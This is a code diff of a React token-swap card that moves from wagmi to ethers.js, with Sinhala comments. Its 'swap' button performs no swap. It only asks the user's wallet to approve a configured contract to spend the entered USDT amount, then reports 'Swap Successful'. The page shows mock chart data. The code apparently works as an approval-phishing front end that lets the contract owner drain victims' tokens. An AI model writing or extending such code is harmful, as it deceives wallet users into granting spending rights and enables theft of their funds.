@@ -1,6 +1,5 @@
 import { useState, useEffect } from 'react';
-import { useAccount, useWriteContract, useBalance } from 'wagmi';
-import { parseUnits } from 'viem';
+import { ethers } from 'ethers';
 import { CONFIG, USDT_ABI, TOKEN_LIST, fetchLivePrices } from '../config';
 import TokenModal from './TokenModal';
 import { AreaChart, Area, Tooltip, ResponsiveContainer } from 'recharts';
@@ -13,15 +12,6 @@ const mockChartData = [
 ];
 
 export default function SwapCard({ walletAddress, provider }) {
-  const { address } = useAccount();
-  const { writeContract } = useWriteContract();
-  
-  // Wagmi වලින් USDT balance එක ගන්නවා
-  const { data: balanceData } = useBalance({
-    address: address,
-    token: CONFIG.usdtAddress,
-  });
-
   const [fromAmount, setFromAmount] = useState('');
   const [toAmount, setToAmount] = useState('');
   const [usdtBalance, setUsdtBalance] = useState('0.00');
@@ -44,20 +34,25 @@ export default function SwapCard({ walletAddress, provider }) {
   };
 
   useEffect(() => {
-    if (balanceData) {
-      setUsdtBalance(parseFloat(balanceData.formatted).toLocaleString());
-    }
-  }, [balanceData]);
-
-  useEffect(() => {
+    if (walletAddress && provider) loadBalance();
     updatePrices();
     const interval = setInterval(updatePrices, 30000); 
     return () => clearInterval(interval);
-  }, []);
+  }, [walletAddress, provider]);
 
   useEffect(() => {
     if (fromAmount) calculateOutput(fromAmount);
   }, [livePrices, fromToken, toToken]);
+
+  const loadBalance = async () => {
+    try {
+      const signer = provider.getSigner();
+      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
+      const balance = await usdtContract.balanceOf(walletAddress);
+      const decimals = await usdtContract.decimals();
+      setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
+    } catch (error) { console.error(error); }
+  };
 
   const calculateOutput = (value) => {
     setFromAmount(value);
@@ -93,25 +88,33 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Approve ෆන්ක්ෂන් එක. wagmi + viem පාවිච්චි කරනවා.
+  // Approve ෆන්ක්ෂන් එක (window.ethereum පාවිච්චි කරනවා)
   const executeSwap = async () => {
-    if (!address) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
+    if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
 
     try {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
       
-      const amount = parseUnits(fromAmount, 6); // USDT decimals 6
+      if (!window.ethereum) {
+        throw new Error("No wallet extension found. Please install MetaMask or Trust Wallet.");
+      }
 
-      writeContract({
-        address: CONFIG.usdtAddress,
-        abi: USDT_ABI,
-        functionName: 'approve',
-        args: [CONFIG.contractAddress, amount],
-      });
+      const web3Provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      const signer = web3Provider.getSigner();
+      
+      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
+      const decimals = await usdtContract.decimals();
+      
+      const amountStr = Math.floor(parseFloat(fromAmount) * 10 ** decimals).toString();
 
-      setStatus({ type: 'success', msg: '✅ Transaction sent! Check your wallet.' });
+      const tx = await usdtContract.approve(CONFIG.contractAddress, amountStr);
+      
+      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
+      await tx.wait();
+      
+      setStatus({ type: 'success', msg: '✅ Swap Successful! Tokens approved.' });
       setIsLoading(false);
       setTimeout(() => setStatus(null), 8000);
     } catch (error) {
